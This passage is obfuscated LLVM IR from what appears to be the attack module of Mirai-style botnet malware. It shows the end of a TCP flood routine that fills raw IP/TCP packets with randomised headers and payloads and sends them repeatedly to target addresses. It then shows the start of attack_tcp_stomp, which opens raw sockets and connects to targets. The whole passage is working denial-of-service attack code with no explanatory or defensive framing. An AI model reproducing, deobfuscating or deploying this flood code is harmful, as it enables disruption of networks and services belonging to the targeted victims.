  %345 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %344, i32 0, i32 4
  %346 = load i16, i16* %345, align 4
  %347 = xor i16 1, -1
  %348 = xor i16 %343, %347
  %349 = and i16 %348, %343
  %350 = and i16 %343, 1
  %351 = shl i16 %349, 10
  %352 = xor i16 %346, -1
  %353 = xor i16 -1025, -1
  %354 = xor i16 6029, -1
  %355 = or i16 %352, %353
  %356 = or i16 6029, %354
  %357 = xor i16 %355, -1
  %358 = and i16 %357, %356
  %359 = and i16 %346, -1025
  %360 = xor i16 %358, -1
  %361 = xor i16 %351, -1
  %362 = xor i16 -12168, -1
  %363 = and i16 %360, -12168
  %364 = and i16 %358, %362
  %365 = and i16 %361, -12168
  %366 = and i16 %351, %362
  %367 = or i16 %363, %364
  %368 = or i16 %365, %366
  %369 = xor i16 %367, %368
  %370 = or i16 %360, %361
  %371 = xor i16 %370, -1
  %372 = or i16 -12168, %362
  %373 = and i16 %371, %372
  %374 = or i16 %369, %373
  %375 = or i16 %358, %351
  store i16 %374, i16* %345, align 4
  %376 = load i8, i8* %26, align 1
  %377 = sext i8 %376 to i16
  %378 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 4
  %380 = load i16, i16* %379, align 4
  %381 = xor i16 %377, -1
  %382 = xor i16 1, -1
  %383 = xor i16 -32002, -1
  %384 = or i16 %381, %382
  %385 = or i16 -32002, %383
  %386 = xor i16 %384, -1
  %387 = and i16 %386, %385
  %388 = and i16 %377, 1
  %389 = shl i16 %387, 9
  %390 = xor i16 %380, -1
  %391 = xor i16 -513, -1
  %392 = xor i16 21548, -1
  %393 = or i16 %390, %391
  %394 = or i16 21548, %392
  %395 = xor i16 %393, -1
  %396 = and i16 %395, %394
  %397 = and i16 %380, -513
  %398 = xor i16 %396, -1
  %399 = xor i16 %389, -1
  %400 = xor i16 -25590, -1
  %401 = and i16 %398, -25590
  %402 = and i16 %396, %400
  %403 = and i16 %399, -25590
  %404 = and i16 %389, %400
  %405 = or i16 %401, %402
  %406 = or i16 %403, %404
  %407 = xor i16 %405, %406
  %408 = or i16 %398, %399
  %409 = xor i16 %408, -1
  %410 = or i16 -25590, %400
  %411 = and i16 %409, %410
  %412 = or i16 %407, %411
  %413 = or i16 %396, %389
  store i16 %412, i16* %379, align 4
  %414 = load i8, i8* %27, align 1
  %415 = sext i8 %414 to i16
  %416 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 4
  %418 = load i16, i16* %417, align 4
  %419 = xor i16 %415, -1
  %420 = xor i16 1, -1
  %421 = xor i16 -4852, -1
  %422 = or i16 %419, %420
  %423 = or i16 -4852, %421
  %424 = xor i16 %422, -1
  %425 = and i16 %424, %423
  %426 = and i16 %415, 1
  %427 = shl i16 %425, 8
  %428 = xor i16 %418, -1
  %429 = xor i16 -257, -1
  %430 = xor i16 -25348, -1
  %431 = or i16 %428, %429
  %432 = or i16 -25348, %430
  %433 = xor i16 %431, -1
  %434 = and i16 %433, %432
  %435 = and i16 %418, -257
  %436 = and i16 %434, %427
  %437 = xor i16 %434, %427
  %438 = or i16 %436, %437
  %439 = or i16 %434, %427
  store i16 %438, i16* %417, align 4
  %440 = call i32 @rand_next()
  %441 = xor i32 %440, -1
  %442 = xor i32 65535, -1
  %443 = xor i32 1258842720, -1
  %444 = or i32 %441, %442
  %445 = or i32 1258842720, %443
  %446 = xor i32 %444, -1
  %447 = and i32 %446, %445
  %448 = and i32 %440, 65535
  %449 = trunc i32 %447 to i16
  %450 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %451 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %450, i32 0, i32 5
  store i16 %449, i16* %451, align 2
  %452 = load i8, i8* %24, align 1
  %453 = icmp ne i8 %452, 0
  br i1 %453, label %454, label %470

; <label>:454:                                    ; preds = %205
  %455 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 4
  %457 = load i16, i16* %456, align 4
  %458 = xor i16 %457, -1
  %459 = xor i16 -2049, -1
  %460 = xor i16 -18557, -1
  %461 = or i16 %458, %459
  %462 = or i16 -18557, %460
  %463 = xor i16 %461, -1
  %464 = and i16 %463, %462
  %465 = and i16 %457, -2049
  %466 = and i16 %464, 2048
  %467 = xor i16 %464, 2048
  %468 = or i16 %466, %467
  %469 = or i16 %464, 2048
  store i16 %468, i16* %456, align 4
  br label %470

; <label>:470:                                    ; preds = %454, %205
  %471 = load i8*, i8** %34, align 8
  %472 = load i32, i32* %28, align 4
  call void @rand_alpha_str(i8* %471, i32 %472)
  %473 = load i8*, i8** %34, align 8
  %474 = load i32, i32* %28, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds i8, i8* %473, i64 %475
  store i8 0, i8* %476, align 1
  br label %477

; <label>:477:                                    ; preds = %470
  %478 = load i32, i32* %11, align 4
  %479 = sub i32 %478, 463215961
  %480 = add i32 %479, 1
  %481 = add i32 %480, 463215961
  %482 = add nsw i32 %478, 1
  store i32 %481, i32* %11, align 4
  br label %129

; <label>:483:                                    ; preds = %129
  br label %484

; <label>:484:                                    ; preds = %678, %483
  store i32 0, i32* %11, align 4
  br label %485

; <label>:485:                                    ; preds = %666, %484
  %486 = load i32, i32* %11, align 4
  %487 = load i8, i8* %7, align 1
  %488 = zext i8 %487 to i32
  %489 = icmp slt i32 %486, %488
  br i1 %489, label %490, label %672

; <label>:490:                                    ; preds = %485
  %491 = load i8**, i8*** %13, align 8
  %492 = load i32, i32* %11, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds i8*, i8** %491, i64 %493
  %495 = load i8*, i8** %494, align 8
  store i8* %495, i8** %35, align 8
  %496 = load i8*, i8** %35, align 8
  %497 = bitcast i8* %496 to %struct.iphdr*
  store %struct.iphdr* %497, %struct.iphdr** %36, align 8
  %498 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %499 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %498, i64 1
  %500 = bitcast %struct.iphdr* %499 to %struct.tcphdr*
  store %struct.tcphdr* %500, %struct.tcphdr** %37, align 8
  %501 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %502 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %501, i64 1
  %503 = bitcast %struct.tcphdr* %502 to i8*
  store i8* %503, i8** %38, align 8
  %504 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %505 = load i32, i32* %11, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %504, i64 %506
  %508 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %507, i32 0, i32 2
  %509 = load i8, i8* %508, align 4
  %510 = zext i8 %509 to i32
  %511 = icmp slt i32 %510, 32
  br i1 %511, label %512, label %536

; <label>:512:                                    ; preds = %490
  %513 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %514 = load i32, i32* %11, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %513, i64 %515
  %517 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %516, i32 0, i32 1
  %518 = load i32, i32* %517, align 4
  %519 = call i32 @ntohl(i32 %518) #7
  %520 = call i32 @rand_next()
  %521 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %522 = load i32, i32* %11, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %521, i64 %523
  %525 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %524, i32 0, i32 2
  %526 = load i8, i8* %525, align 4
  %527 = zext i8 %526 to i32
  %528 = lshr i32 %520, %527
  %529 = sub i32 %519, 1179245013
  %530 = add i32 %529, %528
  %531 = add i32 %530, 1179245013
  %532 = add i32 %519, %528
  %533 = call i32 @htonl(i32 %531) #7
  %534 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %535 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %534, i32 0, i32 9
  store i32 %533, i32* %535, align 4
  br label %536

; <label>:536:                                    ; preds = %512, %490
  %537 = load i32, i32* %30, align 4
  %538 = icmp eq i32 %537, -1
  br i1 %538, label %539, label %543

; <label>:539:                                    ; preds = %536
  %540 = call i32 @rand_next()
  %541 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 8
  store i32 %540, i32* %542, align 4
  br label %543

; <label>:543:                                    ; preds = %539, %536
  %544 = load i16, i16* %15, align 2
  %545 = zext i16 %544 to i32
  %546 = icmp eq i32 %545, 65535
  br i1 %546, label %547, label %556

; <label>:547:                                    ; preds = %543
  %548 = call i32 @rand_next()
  %549 = xor i32 65535, -1
  %550 = xor i32 %548, %549
  %551 = and i32 %550, %548
  %552 = and i32 %548, 65535
  %553 = trunc i32 %551 to i16
  %554 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %555 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %554, i32 0, i32 3
  store i16 %553, i16* %555, align 4
  br label %556

; <label>:556:                                    ; preds = %547, %543
  %557 = load i16, i16* %18, align 2
  %558 = zext i16 %557 to i32
  %559 = icmp eq i32 %558, 65535
  br i1 %559, label %560, label %569

; <label>:560:                                    ; preds = %556
  %561 = call i32 @rand_next()
  %562 = xor i32 65535, -1
  %563 = xor i32 %561, %562
  %564 = and i32 %563, %561
  %565 = and i32 %561, 65535
  %566 = trunc i32 %564 to i16
  %567 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %568 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %567, i32 0, i32 0
  store i16 %566, i16* %568, align 4
  br label %569

; <label>:569:                                    ; preds = %560, %556
  %570 = load i16, i16* %19, align 2
  %571 = zext i16 %570 to i32
  %572 = icmp eq i32 %571, 65535
  br i1 %572, label %573, label %586

; <label>:573:                                    ; preds = %569
  %574 = call i32 @rand_next()
  %575 = xor i32 %574, -1
  %576 = xor i32 65535, -1
  %577 = xor i32 1432155999, -1
  %578 = or i32 %575, %576
  %579 = or i32 1432155999, %577
  %580 = xor i32 %578, -1
  %581 = and i32 %580, %579
  %582 = and i32 %574, 65535
  %583 = trunc i32 %581 to i16
  %584 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %585 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %584, i32 0, i32 1
  store i16 %583, i16* %585, align 2
  br label %586

; <label>:586:                                    ; preds = %573, %569
  %587 = load i32, i32* %20, align 4
  %588 = icmp eq i32 %587, 65535
  br i1 %588, label %589, label %593

; <label>:589:                                    ; preds = %586
  %590 = call i32 @rand_next()
  %591 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %592 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %591, i32 0, i32 2
  store i32 %590, i32* %592, align 4
  br label %593

; <label>:593:                                    ; preds = %589, %586
  %594 = load i32, i32* %21, align 4
  %595 = icmp eq i32 %594, 65535
  br i1 %595, label %596, label %600

; <label>:596:                                    ; preds = %593
  %597 = call i32 @rand_next()
  %598 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 3
  store i32 %597, i32* %599, align 4
  br label %600

; <label>:600:                                    ; preds = %596, %593
  %601 = load i8, i8* %29, align 1
  %602 = icmp ne i8 %601, 0
  br i1 %602, label %603, label %610

; <label>:603:                                    ; preds = %600
  %604 = load i8*, i8** %38, align 8
  %605 = load i32, i32* %28, align 4
  call void @rand_alpha_str(i8* %604, i32 %605)
  %606 = load i8*, i8** %38, align 8
  %607 = load i32, i32* %28, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds i8, i8* %606, i64 %608
  store i8 0, i8* %609, align 1
  br label %610

; <label>:610:                                    ; preds = %603, %600
  %611 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %612 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %611, i32 0, i32 7
  store i16 0, i16* %612, align 2
  %613 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %614 = bitcast %struct.iphdr* %613 to i16*
  %615 = call zeroext i16 @checksum_generic(i16* %614, i32 20)
  %616 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %617 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %616, i32 0, i32 7
  store i16 %615, i16* %617, align 2
  %618 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %619 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %618, i32 0, i32 6
  store i16 0, i16* %619, align 4
  %620 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %621 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %622 = bitcast %struct.tcphdr* %621 to i8*
  %623 = load i32, i32* %28, align 4
  %624 = sext i32 %623 to i64
  %625 = sub i64 0, %624
  %626 = sub i64 20, %625
  %627 = add i64 20, %624
  %628 = trunc i64 %626 to i16
  %629 = call zeroext i16 @htons(i16 zeroext %628) #7
  %630 = load i32, i32* %28, align 4
  %631 = sext i32 %630 to i64
  %632 = sub i64 0, %631
  %633 = sub i64 20, %632
  %634 = add i64 20, %631
  %635 = trunc i64 %633 to i32
  %636 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %620, i8* %622, i16 zeroext %629, i32 %635)
  %637 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %638 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %637, i32 0, i32 6
  store i16 %636, i16* %638, align 4
  %639 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %640 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %639, i32 0, i32 1
  %641 = load i16, i16* %640, align 2
  %642 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %643 = load i32, i32* %11, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %642, i64 %644
  %646 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %645, i32 0, i32 0
  %647 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %646, i32 0, i32 1
  store i16 %641, i16* %647, align 2
  %648 = load i32, i32* %12, align 4
  %649 = load i8*, i8** %35, align 8
  %650 = load i32, i32* %28, align 4
  %651 = sext i32 %650 to i64
  %652 = sub i64 40, 4176248161340594644
  %653 = add i64 %652, %651
  %654 = add i64 %653, 4176248161340594644
  %655 = add i64 40, %651
  %656 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %657 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %658 = load i32, i32* %11, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %657, i64 %659
  %661 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %660, i32 0, i32 0
  %662 = bitcast %struct.sockaddr_in* %661 to %struct.sockaddr*
  store %struct.sockaddr* %662, %struct.sockaddr** %656, align 8
  %663 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %664 = load %struct.sockaddr*, %struct.sockaddr** %663, align 8
  %665 = call i64 @sendto(i32 %648, i8* %649, i64 %654, i32 16384, %struct.sockaddr* %664, i32 16)
  br label %666

; <label>:666:                                    ; preds = %610
  %667 = load i32, i32* %11, align 4
  %668 = sub i32 %667, 1554401363
  %669 = add i32 %668, 1
  %670 = add i32 %669, 1554401363
  %671 = add nsw i32 %667, 1
  store i32 %670, i32* %11, align 4
  br label %485

; <label>:672:                                    ; preds = %485
  %673 = call i64 @time(i64* null) #6
  %674 = load i32, i32* %31, align 4
  %675 = sext i32 %674 to i64
  %676 = icmp sgt i64 %673, %675
  br i1 %676, label %677, label %678

; <label>:677:                                    ; preds = %672
  br label %679

; <label>:678:                                    ; preds = %672
  br label %484

; <label>:679:                                    ; preds = %677, %125, %119
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_stomp_data*, align 8
  %14 = alloca i8**, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i16, align 2
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.sockaddr_in, align 4
  %31 = alloca %struct.sockaddr_in, align 4
  %32 = alloca i32, align 4
  %33 = alloca [256 x i8], align 16
  %34 = alloca i64, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %36 = alloca i32, align 4
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %struct.iphdr*, align 8
  %44 = alloca %struct.tcphdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias i8* @calloc(i64 %48, i64 16) #6
  %50 = bitcast i8* %49 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %50, %struct.attack_stomp_data** %13, align 8
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias i8* @calloc(i64 %52, i64 8) #6
  %54 = bitcast i8* %53 to i8**
  store i8** %54, i8*** %14, align 8
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 2, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 3, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 4, i32 64)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %17, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 5, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 65535)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %19, align 2
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 10, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %20, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %21, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %22, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %23, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %24, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %25, align 1
  %99 = load i8, i8* %9, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 0, i32 768)
  store i32 %101, i32* %26, align 4
  %102 = load i8, i8* %9, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 1, i32 1)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %27, align 1
  %106 = call i64 @time(i64* null) #6
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = add i64 %106, 7524329596284198951
  %110 = add i64 %109, %108
  %111 = sub i64 %110, 7524329596284198951
  %112 = add nsw i64 %106, %108
  %113 = trunc i64 %111 to i32
  store i32 %113, i32* %28, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %12, align 4
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %5
  br label %885

; <label>:117:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %118 = load i32, i32* %12, align 4
  %119 = bitcast i32* %11 to i8*
  %120 = call i32 @setsockopt(i32 %118, i32 0, i32 3, i8* %119, i32 4) #6
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %117
  %123 = load i32, i32* %12, align 4
  %124 = call i32 @close(i32 %123)
  br label %885

; <label>:125:                                    ; preds = %117
  store i32 0, i32* %11, align 4
  br label %126

; <label>:126:                                    ; preds = %736, %125
  %127 = load i32, i32* %11, align 4
  %128 = load i8, i8* %7, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp slt i32 %127, %129
  br i1 %130, label %131, label %742

; <label>:131:                                    ; preds = %126
  store i32 0, i32* %29, align 4
  br label %132

; <label>:132:                                    ; preds = %731, %718, %131
  %133 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %133, i32* %29, align 4
  %134 = icmp eq i32 %133, -1
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %132
  br label %736

; <label>:136:                                    ; preds = %132
  %137 = load i32, i32* %29, align 4
  %138 = load i32, i32* %29, align 4
  %139 = call i32 (i32, i32, ...) @fcntl(i32 %138, i32 3, i32 0)
  %140 = xor i32 %139, -1
  %141 = xor i32 2048, -1
  %142 = xor i32 -844074059, -1
  %143 = and i32 %140, -844074059
  %144 = and i32 %139, %142
  %145 = and i32 %141, -844074059
  %146 = and i32 2048, %142
  %147 = or i32 %143, %144
  %148 = or i32 %145, %146
  %149 = xor i32 %147, %148
  %150 = or i32 %140, %141
  %151 = xor i32 %150, -1
  %152 = or i32 -844074059, %142
  %153 = and i32 %151, %152
  %154 = or i32 %149, %153
  %155 = or i32 %139, 2048
  %156 = call i32 (i32, i32, ...) @fcntl(i32 %137, i32 4, i32 %154)
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 0
  store i16 2, i16* %157, align 4
  %158 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %159 = load i32, i32* %11, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 2
  %163 = load i8, i8* %162, align 4
  %164 = zext i8 %163 to i32
  %165 = icmp slt i32 %164, 32
  br i1 %165, label %166, label %191

; <label>:166:                                    ; preds = %136
  %167 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %168 = load i32, i32* %11, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = call i32 @ntohl(i32 %172) #7
  %174 = call i32 @rand_next()
  %175 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %176 = load i32, i32* %11, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i64 %177
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i32 0, i32 2
  %180 = load i8, i8* %179, align 4
  %181 = zext i8 %180 to i32
  %182 = lshr i32 %174, %181
  %183 = sub i32 0, %173
  %184 = sub i32 0, %182
  %185 = add i32 %183, %184
  %186 = sub i32 0, %185
  %187 = add i32 %173, %182
  %188 = call i32 @htonl(i32 %186) #7
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %189, i32 0, i32 0
  store i32 %188, i32* %190, align 4
  br label %200

; <label>:191:                                    ; preds = %136
  %192 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %193 = load i32, i32* %11, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i64 %194
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %195, i32 0, i32 1
  %197 = load i32, i32* %196, align 4
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %199 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %198, i32 0, i32 0
  store i32 %197, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %191, %166
  %201 = load i16, i16* %19, align 2
  %202 = zext i16 %201 to i32
  %203 = icmp eq i32 %202, 65535
  br i1 %203, label %204, label %212

; <label>:204:                                    ; preds = %200
  %205 = call i32 @rand_next()
  %206 = xor i32 65535, -1
  %207 = xor i32 %205, %206
  %208 = and i32 %207, %205
  %209 = and i32 %205, 65535
  %210 = trunc i32 %208 to i16
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %210, i16* %211, align 2
  br label %216

; <label>:212:                                    ; preds = %200
  %213 = load i16, i16* %19, align 2
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %214, i16* %215, align 2
  br label %216

; <label>:216:                                    ; preds = %212, %204
  %217 = load i32, i32* %29, align 4
  %218 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %219 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %219, %struct.sockaddr** %218, align 8
  %220 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %221 = load %struct.sockaddr*, %struct.sockaddr** %220, align 8
  %222 = call i32 @connect(i32 %217, %struct.sockaddr* %221, i32 16)
  %223 = call i64 @time(i64* null) #6
  store i64 %223, i64* %34, align 8
  br label %224

; <label>:224:                                    ; preds = %734, %216
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %225 = load i32, i32* %12, align 4
  %226 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %227 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %228 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %228, %struct.sockaddr** %227, align 8
  %229 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %230 = load %struct.sockaddr*, %struct.sockaddr** %229, align 8
  %231 = call i64 @recvfrom(i32 %225, i8* %226, i64 256, i32 16384, %struct.sockaddr* %230, i32* %32)
  %232 = trunc i64 %231 to i32
  store i32 %232, i32* %36, align 4
  %233 = load i32, i32* %36, align 4
  %234 = icmp eq i32 %233, -1
  br i1 %234, label %235, label %236

; <label>:235:                                    ; preds = %224
  br label %885

